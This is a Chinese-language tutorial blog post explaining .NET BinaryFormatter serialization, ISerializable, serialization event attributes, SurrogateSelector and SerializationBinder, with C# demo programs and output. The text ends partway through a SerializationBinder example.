<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h2 data-content="1" id="e1c63c43a826fba9a93d6cea5e31be79">BinaryFormatter</h2>
<pre><code>System.Runtime.Serialization.Formatters.Binary.BinaryFormatter</code></pre>
<p><code>SoapFormatter</code>和<code>BinaryFormatter</code>类实现<code>IRemotingFormatter</code>接口以支持远程过程调用 (RPC)，并实现<code>IFormatter</code>接口.</p>
<p>根据微软的文档，当formatter调用Serialize方法的时候，会有以下的生命周期。</p>
<ol>
<li>首先确定formatter是否有代理选择器，如果有则检查代理选择器要处理的对象类型是否和给定的对象类型一致，如果一致，代理选择器会调用<code>ISerializable.GetObjectData()</code>。</li>
<li>如果没有代理选择器，或者代理选择器不处理该对象类型，则检查对象是否有<code>[Serializable]</code>特性。如果不能序列化则抛出异常。</li>
<li>检查该对象是否实现<code>ISerialized</code>接口，如果实现就调用其<code>GetObjectData</code>方法。</li>
<li>如果没有实现ISerialized接口就使用默认的序列化策略，序列化所以没有标记<code>[NonSerialized]</code>的字段。</li>
</ol>
<div class="highlight"><pre><span></span><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Collections.Generic</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.IO</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Linq</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Runtime.Serialization.Formatters.Binary</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Text</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Threading.Tasks</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">static</span> <span class="n">ConsoleApp4</span><span class="p">.</span><span class="n">Program</span><span class="p">;</span>

<span class="k">namespace</span> <span class="nn">ConsoleApp4</span>
<span class="p">{</span>
    <span class="k">internal</span> <span class="k">class</span> <span class="nc">Program</span>
    <span class="p">{</span>
<span class="na">        [Serializable]</span>
        <span class="k">public</span> <span class="k">class</span> <span class="nf">Myser</span><span class="p">()</span>
        <span class="p">{</span>

            <span class="k">public</span> <span class="kt">int</span> <span class="n">a</span><span class="p">;</span>
            <span class="k">public</span> <span class="kt">int</span> <span class="n">b</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">static</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
        <span class="p">{</span>

            <span class="n">Myser</span> <span class="n">myser</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Myser</span><span class="p">();</span>
            <span class="n">myser</span><span class="p">.</span><span class="n">a</span> <span class="p">=</span> <span class="m">1</span><span class="p">;</span>
            <span class="n">myser</span><span class="p">.</span><span class="n">b</span> <span class="p">=</span> <span class="m">2</span><span class="p">;</span>
            <span class="kt">string</span> <span class="n">filename</span> <span class="p">=</span> <span class="s">" C:\\Users\\sangfor\\source\\repos\\ConsoleApp4\\ConsoleApp4\\1.txt"</span><span class="p">;</span>
            <span class="c1">//  SerializeToFile(filename, myser);</span>
            <span class="n">FiletoDeserial</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span>
            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">();</span>

        <span class="p">}</span>



        <span class="k">static</span> <span class="k">public</span> <span class="k">void</span> <span class="nf">SerializeToFile</span><span class="p">(</span><span class="kt">string</span> <span class="n">filename</span> <span class="p">,</span> <span class="n">Myser</span> <span class="n">myser</span><span class="p">)</span> <span class="p">{</span>
            <span class="c1">// C:\\Users\\sangfor\\source\\repos\\ConsoleApp4\\ConsoleApp4\\1.txt</span>

            <span class="n">FileStream</span> <span class="n">fileStream</span> <span class="p">=</span> <span class="k">new</span> <span class="n">FileStream</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">FileMode</span><span class="p">.</span><span class="n">Create</span><span class="p">,</span> <span class="n">FileAccess</span><span class="p">.</span><span class="n">Write</span><span class="p">,</span> <span class="n">FileShare</span><span class="p">.</span><span class="n">None</span><span class="p">);</span>
            <span class="n">BinaryFormatter</span> <span class="n">binaryFormatter</span> <span class="p">=</span> <span class="k">new</span> <span class="n">BinaryFormatter</span><span class="p">();</span>
            <span class="n">binaryFormatter</span><span class="p">.</span><span class="n">Serialize</span><span class="p">(</span><span class="n">fileStream</span><span class="p">,</span> <span class="n">myser</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">static</span> <span class="k">public</span> <span class="k">void</span> <span class="nf">FiletoDeserial</span><span class="p">(</span><span class="kt">string</span> <span class="n">filename</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">FileStream</span> <span class="n">fileStream</span> <span class="p">=</span> <span class="k">new</span> <span class="n">FileStream</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">FileMode</span><span class="p">.</span><span class="n">Open</span><span class="p">,</span> <span class="n">FileAccess</span><span class="p">.</span><span class="n">Read</span><span class="p">,</span> <span class="n">FileShare</span><span class="p">.</span><span class="n">None</span><span class="p">);</span>
            <span class="n">BinaryFormatter</span> <span class="n">binaryFormatter</span> <span class="p">=</span> <span class="k">new</span> <span class="n">BinaryFormatter</span><span class="p">();</span>
            <span class="n">Myser</span> <span class="n">myser1</span> <span class="p">=(</span><span class="n">Myser</span><span class="p">)</span> <span class="n">binaryFormatter</span><span class="p">.</span><span class="n">Deserialize</span><span class="p">(</span><span class="n">fileStream</span><span class="p">);</span>
            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">myser1</span><span class="p">.</span><span class="n">a</span><span class="p">);</span>
            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">myser1</span><span class="p">.</span><span class="n">b</span><span class="p">);</span>

            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">();</span>

        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
<p>微软给定手册需要序列化的class需要使用<code>Serializable</code>特性来标记,也可以使用<code>NonSerialized</code>来标记不需要反序列化的属性</p>
<h2 data-content="1" id="0a83fe0a3898d047887cd2faa4c3941f">ISerializable接口</h2>
<p>自定义序列化是控制类型的序列化和反序列化的过程。通过控制序列化，可以确保序列化兼容性，即在不破坏类型的核心功能的情况下在类型的版本之间进行序列化和反序列化的能力。</p>
<p>控制二进制序列化的另一种方法是在对象上实现<a href="https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.iserializable" target="_blank">ISerialized接口。</a></p>
<p>当GetObjectData在序列化期间调用时，您负责填充随方法调用提供的<a href="https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.serializationinfo" target="_blank">SerializationInfo 。</a>添加要序列化的变量作为名称和值对。任何文本都可以用作名称。您可以自由决定将哪些成员变量添加到 <code>SerializationInfo</code> 中<a href="https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.serializationinfo" target="_blank">，</a>前提是序列化了足够的数据以在反序列化期间恢复对象。<a href="https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.iserializable" target="_blank">如果基对象实现了ISerialized</a> ，则派生类应该调用GetObjectData基对象上的方法。</p>
<p>在实现ISerializable的时候必须实现带<code>SerializationInfo</code>的构造方法。</p>
<div class="highlight"><pre><span></span><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Collections.Generic</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.IO</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Linq</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Runtime.Serialization</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Runtime.Serialization.Formatters.Binary</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Text</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Threading.Tasks</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">static</span> <span class="n">ConsoleApp4</span><span class="p">.</span><span class="n">Program</span><span class="p">;</span>

<span class="k">namespace</span> <span class="nn">ConsoleApp4</span>
<span class="p">{</span>
    <span class="k">internal</span> <span class="k">class</span> <span class="nc">Program</span>
    <span class="p">{</span>
<span class="na">        [Serializable]</span>
        <span class="k">public</span> <span class="k">class</span> <span class="nc">Myser</span> <span class="p">:</span> <span class="n">ISerializable</span>
        <span class="p">{</span>
            <span class="k">public</span> <span class="kt">int</span> <span class="n">n1</span><span class="p">;</span>
            <span class="k">public</span> <span class="kt">int</span> <span class="n">n2</span><span class="p">;</span>
            <span class="k">public</span> <span class="n">String</span> <span class="n">str</span><span class="p">;</span>

            <span class="k">public</span> <span class="nf">Myser</span><span class="p">()</span>
            <span class="p">{</span>
            <span class="p">}</span>

            <span class="c1">//实现了ISerializable接口的类必须包含有序列化构造函数，否则会出错。</span>
            <span class="k">protected</span> <span class="nf">Myser</span><span class="p">(</span><span class="n">SerializationInfo</span> <span class="n">info</span><span class="p">,</span> <span class="n">StreamingContext</span> <span class="n">context</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">"Deserial"</span><span class="p">);</span>
                <span class="n">n1</span> <span class="p">=</span> <span class="n">info</span><span class="p">.</span><span class="n">GetInt32</span><span class="p">(</span><span class="s">"i"</span><span class="p">);</span>
                <span class="n">n2</span> <span class="p">=</span> <span class="n">info</span><span class="p">.</span><span class="n">GetInt32</span><span class="p">(</span><span class="s">"j"</span><span class="p">);</span>
                <span class="n">str</span> <span class="p">=</span> <span class="n">info</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="s">"k"</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="k">void</span> <span class="n">ISerializable</span><span class="p">.</span><span class="n">GetObjectData</span><span class="p">(</span><span class="n">SerializationInfo</span> <span class="n">info</span><span class="p">,</span> <span class="n">StreamingContext</span> <span class="n">context</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">"Serialize"</span><span class="p">);</span>
                <span class="n">info</span><span class="p">.</span><span class="n">AddValue</span><span class="p">(</span><span class="s">"i"</span><span class="p">,</span> <span class="n">n1</span><span class="p">);</span>
                <span class="n">info</span><span class="p">.</span><span class="n">AddValue</span><span class="p">(</span><span class="s">"j"</span><span class="p">,</span> <span class="n">n2</span><span class="p">);</span>
                <span class="n">info</span><span class="p">.</span><span class="n">AddValue</span><span class="p">(</span><span class="s">"k"</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>

            <span class="p">}</span>
        <span class="p">}</span>

        <span class="k">static</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="kt">string</span> <span class="n">filename</span> <span class="p">=</span> <span class="s">"C:\\Users\\sangfor\\source\\repos\\ConsoleApp4\\ConsoleApp4\\1.txt"</span><span class="p">;</span>
            <span class="n">Myser</span> <span class="n">myser</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Myser</span><span class="p">();</span>
            <span class="n">myser</span><span class="p">.</span><span class="n">n1</span> <span class="p">=</span> <span class="m">1</span><span class="p">;</span>
            <span class="n">myser</span><span class="p">.</span><span class="n">n2</span> <span class="p">=</span> <span class="m">2</span><span class="p">;</span>
            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">();</span>
        <span class="c1">//    SerializeToFile(filename, myser);</span>
            <span class="n">FiletoDeserial</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span>
        <span class="p">}</span>



        <span class="k">static</span> <span class="k">public</span> <span class="k">void</span> <span class="nf">SerializeToFile</span><span class="p">(</span><span class="kt">string</span> <span class="n">filename</span><span class="p">,</span> <span class="n">Myser</span> <span class="n">myser</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="c1">// C:\\Users\\sangfor\\source\\repos\\ConsoleApp4\\ConsoleApp4\\1.txt</span>

            <span class="n">FileStream</span> <span class="n">fileStream</span> <span class="p">=</span> <span class="k">new</span> <span class="n">FileStream</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">FileMode</span><span class="p">.</span><span class="n">Create</span><span class="p">,</span> <span class="n">FileAccess</span><span class="p">.</span><span class="n">Write</span><span class="p">,</span> <span class="n">FileShare</span><span class="p">.</span><span class="n">None</span><span class="p">);</span>
            <span class="n">BinaryFormatter</span> <span class="n">binaryFormatter</span> <span class="p">=</span> <span class="k">new</span> <span class="n">BinaryFormatter</span><span class="p">();</span>
            <span class="n">binaryFormatter</span><span class="p">.</span><span class="n">Serialize</span><span class="p">(</span><span class="n">fileStream</span><span class="p">,</span> <span class="n">myser</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">static</span> <span class="k">public</span> <span class="k">void</span> <span class="nf">FiletoDeserial</span><span class="p">(</span><span class="kt">string</span> <span class="n">filename</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">FileStream</span> <span class="n">fileStream</span> <span class="p">=</span> <span class="k">new</span> <span class="n">FileStream</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">FileMode</span><span class="p">.</span><span class="n">Open</span><span class="p">,</span> <span class="n">FileAccess</span><span class="p">.</span><span class="n">Read</span><span class="p">,</span> <span class="n">FileShare</span><span class="p">.</span><span class="n">None</span><span class="p">);</span>
            <span class="n">BinaryFormatter</span> <span class="n">binaryFormatter</span> <span class="p">=</span> <span class="k">new</span> <span class="n">BinaryFormatter</span><span class="p">();</span>
            <span class="n">Myser</span> <span class="n">myser1</span> <span class="p">=</span> <span class="p">(</span><span class="n">Myser</span><span class="p">)</span><span class="n">binaryFormatter</span><span class="p">.</span><span class="n">Deserialize</span><span class="p">(</span><span class="n">fileStream</span><span class="p">);</span>
            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">myser1</span><span class="p">.</span><span class="n">n1</span><span class="p">);</span>
            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">myser1</span><span class="p">.</span><span class="n">n2</span><span class="p">);</span>

            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">();</span>

        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
<p>如上所述，需要使用到序列化的值的话，需要在<code>GetObjectData</code>方法中进行<code>info.AddValue("i", n1);</code>赋值到键值对中，而在反序列化的需要取对应的值的话需要在自定义携带<code>SerializationInfo</code>的构造方法中<code>info.GetInt32("i");</code>获取反序列化需要取得的值    。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231108201143-faef85ec-7e2f-1.png"/></p>
<p>上图可以看到在str这个变量并没有在加入到<code>SerializationInfo</code>里面所以不会被序列化，反序列化取值肯定也是为空的</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231108201159-048c8078-7e30-1.png"/></p>
<p><a href="https://learn.microsoft.com/zh-cn/previous-versions/dotnet/fundamentals/serialization/binary/custom-serialization" target="_blank">https://learn.microsoft.com/zh-cn/previous-versions/dotnet/fundamentals/serialization/binary/custom-serialization</a></p>
<p>反序列化有如下四个事件</p>
<table>
<thead>
<tr>
<th>特性</th>
<th>调用关联的方法时</th>
<th>典型用法</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.runtime.serialization.ondeserializingattribute" target="_blank">OnDeserializingAttribute</a></td>
<td>反序列化之前</td>
<td>初始化可选字段的默认值。</td>
</tr>
<tr>
<td><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.runtime.serialization.ondeserializedattribute" target="_blank">OnDeserializedAttribute</a></td>
<td>反序列化之后</td>
<td>根据其他字段的内容修改可选字段值。</td>
</tr>
<tr>
<td><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.runtime.serialization.onserializingattribute" target="_blank">OnSerializingAttribute</a></td>
<td>序列化之前</td>
<td>准备序列化。 例如，创建可选数据结构。</td>
</tr>
<tr>
<td><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.runtime.serialization.onserializedattribute" target="_blank">OnSerializedAttribute</a></td>
<td>序列化之后</td>
<td>记录序列化事件。</td>
</tr>
</tbody>
</table>
<p>IFormatter定义了序列化和反序列化的两个方法，以及三个字段，其中每个字段含义如下：</p>
<table>
<thead>
<tr>
<th>类 字段名</th>
<th>含义用途</th>
</tr>
</thead>
<tbody>
<tr>
<td>ISurrogateSelector SurrogateSelector</td>
<td>序列化代理选择器 接管formatter的序列化或反序列化处理</td>
</tr>
<tr>
<td>SerializationBinder Binder</td>
<td>用于控制在序列化和反序列化期间使用的实际类型</td>
</tr>
<tr>
<td>StreamingContext Context</td>
<td>序列化流上下文 其中states字段包含了序列化的来源和目的地</td>
</tr>
</tbody>
</table>
<p>通过这三个字段，我们可以控制序列化和反序列化时数据的类型、值以及其他信息。</p>
<h3 data-content="1" id="41f5f98a1b15045196256b7967bafde1">SurrogateSelector</h3>
<div class="highlight"><pre><span></span><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.IO</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Runtime.Serialization</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Runtime.Serialization.Formatters.Binary</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Security.Permissions</span><span class="p">;</span>

<span class="k">namespace</span> <span class="nn">NetSerializer</span>
<span class="p">{</span>
<span class="na">    [Serializable]</span>
    <span class="k">public</span> <span class="k">class</span> <span class="nc">MyObject</span> <span class="p">:</span> <span class="n">ISerializable</span>
    <span class="p">{</span>
        <span class="k">public</span> <span class="kt">string</span> <span class="n">str</span> <span class="p">{</span> <span class="k">get</span><span class="p">;</span> <span class="k">set</span><span class="p">;</span> <span class="p">}</span>
        <span class="k">public</span> <span class="nf">MyObject</span><span class="p">()</span>
        <span class="p">{</span>
        <span class="p">}</span>
        <span class="c1">//实现了ISerializable接口的类必须包含有序列化构造函数，否则会出错。</span>
        <span class="k">protected</span> <span class="nf">MyObject</span><span class="p">(</span><span class="n">SerializationInfo</span> <span class="n">info</span><span class="p">,</span> <span class="n">StreamingContext</span> <span class="n">context</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">"MyObject(SerializationInfo info, StreamingContext context)"</span><span class="p">);</span>
            <span class="n">str</span> <span class="p">=</span> <span class="n">info</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="s">"str"</span><span class="p">);</span>
        <span class="p">}</span>

<span class="na">        [SecurityPermission(SecurityAction.LinkDemand, Flags = SecurityPermissionFlag.SerializationFormatter)]</span>
        <span class="k">public</span> <span class="k">virtual</span> <span class="k">void</span> <span class="nf">GetObjectData</span><span class="p">(</span><span class="n">SerializationInfo</span> <span class="n">info</span><span class="p">,</span> <span class="n">StreamingContext</span> <span class="n">context</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">"GetObjectData of MyObject.class"</span><span class="p">);</span>
            <span class="n">info</span><span class="p">.</span><span class="n">AddValue</span><span class="p">(</span><span class="s">"str"</span><span class="p">,</span> <span class="n">str</span><span class="p">,</span> <span class="k">typeof</span><span class="p">(</span><span class="kt">string</span><span class="p">));</span>
        <span class="p">}</span>

<span class="na">        [OnDeserializing]</span>
        <span class="k">private</span> <span class="k">void</span> <span class="nf">TestOnDeserializing</span><span class="p">(</span><span class="n">StreamingContext</span> <span class="n">sc</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">"TestOnDeserializing"</span><span class="p">);</span>

        <span class="p">}</span>
<span class="na">        [OnDeserialized]</span>
        <span class="k">private</span> <span class="k">void</span> <span class="nf">TestOnDeserialized</span><span class="p">(</span><span class="n">StreamingContext</span> <span class="n">sc</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">"TestOnDeserialized"</span><span class="p">);</span>
        <span class="p">}</span>
<span class="na">        [OnSerializing]</span>
        <span class="k">private</span> <span class="k">void</span> <span class="nf">TestOnSerializing</span><span class="p">(</span><span class="n">StreamingContext</span> <span class="n">sc</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">"TestOnSerializing"</span><span class="p">);</span>
        <span class="p">}</span>
<span class="na">        [OnSerialized]</span>
        <span class="k">private</span> <span class="k">void</span> <span class="nf">TestOnSerialized</span><span class="p">(</span><span class="n">StreamingContext</span> <span class="n">sc</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">"TestOnSerialized"</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">class</span> <span class="nc">MySerializationSurrogate</span> <span class="p">:</span> <span class="n">ISerializationSurrogate</span>
    <span class="p">{</span>
        <span class="k">public</span> <span class="k">void</span> <span class="nf">GetObjectData</span><span class="p">(</span><span class="kt">object</span> <span class="n">obj</span><span class="p">,</span> <span class="n">SerializationInfo</span> <span class="n">info</span><span class="p">,</span> <span class="n">StreamingContext</span> <span class="n">context</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">"GetObjectData of ISerializationSurrogate"</span><span class="p">);</span>
            <span class="n">info</span><span class="p">.</span><span class="n">AddValue</span><span class="p">(</span><span class="s">"str"</span><span class="p">,</span> <span class="p">((</span><span class="n">MyObject</span><span class="p">)</span><span class="n">obj</span><span class="p">).</span><span class="n">str</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">public</span> <span class="kt">object</span> <span class="nf">SetObjectData</span><span class="p">(</span><span class="kt">object</span> <span class="n">obj</span><span class="p">,</span> <span class="n">SerializationInfo</span> <span class="n">info</span><span class="p">,</span> <span class="n">StreamingContext</span> <span class="n">context</span><span class="p">,</span> <span class="n">ISurrogateSelector</span> <span class="n">selector</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">"SetObjectData of ISerializationSurrogate"</span><span class="p">);</span>
            <span class="n">MyObject</span> <span class="n">m</span> <span class="p">=</span> <span class="k">new</span> <span class="n">MyObject</span><span class="p">();</span>
            <span class="n">m</span><span class="p">.</span><span class="n">str</span> <span class="p">=</span> <span class="p">(</span><span class="kt">string</span><span class="p">)</span><span class="n">info</span><span class="p">.</span><span class="n">GetValue</span><span class="p">(</span><span class="s">"str"</span><span class="p">,</span> <span class="k">typeof</span><span class="p">(</span><span class="kt">string</span><span class="p">));</span>
            <span class="k">return</span> <span class="n">m</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">class</span> <span class="nc">Program</span>
    <span class="p">{</span>
        <span class="k">static</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="k">try</span>
            <span class="p">{</span>
                <span class="n">MyObject</span> <span class="n">myObject</span> <span class="p">=</span> <span class="k">new</span> <span class="n">MyObject</span><span class="p">();</span>
                <span class="n">myObject</span><span class="p">.</span><span class="n">str</span> <span class="p">=</span> <span class="s">"hello"</span><span class="p">;</span>

                <span class="k">using</span> <span class="p">(</span><span class="n">MemoryStream</span> <span class="n">memoryStream</span> <span class="p">=</span> <span class="k">new</span> <span class="n">MemoryStream</span><span class="p">())</span>
                <span class="p">{</span>
                    <span class="c1">// 构建formatter</span>
                    <span class="n">BinaryFormatter</span> <span class="n">binaryFormatter</span> <span class="p">=</span> <span class="k">new</span> <span class="n">BinaryFormatter</span><span class="p">();</span>

                    <span class="c1">// 设置序列化代理选择器</span>
                    <span class="n">SurrogateSelector</span> <span class="n">ss</span> <span class="p">=</span> <span class="k">new</span> <span class="n">SurrogateSelector</span><span class="p">();</span>
                    <span class="n">ss</span><span class="p">.</span><span class="n">AddSurrogate</span><span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="n">MyObject</span><span class="p">),</span> <span class="n">binaryFormatter</span><span class="p">.</span><span class="n">Context</span><span class="p">,</span> <span class="k">new</span> <span class="n">MySerializationSurrogate</span><span class="p">());</span>
                    <span class="c1">// 赋值给formatter 这里是否设置代理选择器决定了序列化的生命周期</span>
                    <span class="n">binaryFormatter</span><span class="p">.</span><span class="n">SurrogateSelector</span> <span class="p">=</span> <span class="n">ss</span><span class="p">;</span>
                    <span class="c1">// 序列化</span>
                    <span class="n">binaryFormatter</span><span class="p">.</span><span class="n">Serialize</span><span class="p">(</span><span class="n">memoryStream</span><span class="p">,</span> <span class="n">myObject</span><span class="p">);</span>
                    <span class="c1">// 重置stream</span>
                    <span class="n">memoryStream</span><span class="p">.</span><span class="n">Position</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>
                    <span class="n">myObject</span> <span class="p">=</span> <span class="k">null</span><span class="p">;</span>
                    <span class="c1">// 反序列化</span>
                    <span class="n">myObject</span> <span class="p">=</span> <span class="p">(</span><span class="n">MyObject</span><span class="p">)</span><span class="n">binaryFormatter</span><span class="p">.</span><span class="n">Deserialize</span><span class="p">(</span><span class="n">memoryStream</span><span class="p">);</span>
                    <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">myObject</span><span class="p">.</span><span class="n">str</span><span class="p">);</span>    <span class="c1">// hello</span>
                <span class="p">}</span>

            <span class="p">}</span>
            <span class="k">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">e</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">StackTrace</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="n">Console</span><span class="p">.</span><span class="n">ReadKey</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
<p>结果</p>
<div class="highlight"><pre><span></span><span class="n">TestOnSerializing</span>
<span class="n">GetObjectData</span> <span class="n">of</span> <span class="n">ISerializationSurrogate</span>
<span class="n">TestOnSerialized</span>
<span class="n">TestOnDeserializing</span>
<span class="n">SetObjectData</span> <span class="n">of</span> <span class="n">ISerializationSurrogate</span>
<span class="n">TestOnDeserialized</span>
<span class="n">hello</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="n">SurrogateSelector</span> <span class="n">ss</span> <span class="p">=</span> <span class="k">new</span> <span class="n">SurrogateSelector</span><span class="p">();</span>
    <span class="n">s</span><span class="p">.</span><span class="n">AddSurrogate</span><span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="n">MyObject</span><span class="p">),</span> <span class="n">binaryFormatter</span><span class="p">.</span><span class="n">Context</span><span class="p">,</span> <span class="k">new</span> <span class="n">MySerializationSurrogate</span><span class="p">());</span>
    <span class="c1">// 赋值给formatter 这里是否设置代理选择器决定了序列化的生命周期</span>
    <span class="n">binaryFormatter</span><span class="p">.</span><span class="n">SurrogateSelector</span> <span class="p">=</span> <span class="n">ss</span><span class="p">;</span>
</pre></div>
<p>设置代理选择器后，在序列化化和反序列化过程中会执行<code>ISerializationSurrogate</code>接口实现的2个方法，分别是<code>GetObjectData</code>和<code>SetObjectData</code>,而不会执行<code>MyObject</code>里面的<code>GetObjectData</code><br/>
以下是流程图</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231108201216-0eeb07a6-7e30-1.png"/></p>
<h3 data-content="1" id="1ddfaa14b494615cbc66cfeef0712928">SerializationBinder</h3>
<p>只有在完全确定要序列化哪些类的时候，才使用SerializationBinder。恶意类型可能会导致非预期的行为。是预防恶意反序列化利用的一种方式。</p>
<p><code>SerializationBinder</code>继承时，必须重写<code>BindToType(String, String)</code>方法</p>
<p>(string assemblyName, string typeName)</p>
<p><code>assemblyName</code>为程序集名称</p>
<h3 data-content="1" id="177b0fe37f943159d362b825d80209ca"> </h3>
<div class="highlight"><pre><span></span><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.IO</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Runtime.Serialization</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Runtime.Serialization.Formatters.Binary</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Reflection</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">static</span> <span class="n">ConsoleApp3</span><span class="p">.</span><span class="n">Program</span><span class="p">;</span>

<span class="k">namespace</span> <span class="nn">ConsoleApp3</span>
<span class="p">{</span>
    <span class="k">internal</span> <span class="k">class</span> <span class="nc">Program</span>
    <span class="p">{</span>
<span class="na">        [Serializable]</span>
        <span class="k">public</span> <span class="k">class</span> <span class="nc">Myser</span> <span class="p">:</span> <span class="n">ISerializable</span>
        <span class="p">{</span>
            <span class="k">public</span> <span class="kt">int</span> <span class="n">n1</span><span class="p">;</span>
            <span class="k">public</span> <span class="kt">int</span> <span class="n">n2</span><span class="p">;</span>
            <span class="k">public</span> <span class="n">String</span> <span class="n">str</span><span class="p">;</span>

            <span class="k">public</span> <span class="nf">Myser</span><span class="p">()</span>
            <span class="p">{</span>
            <span class="p">}</span>

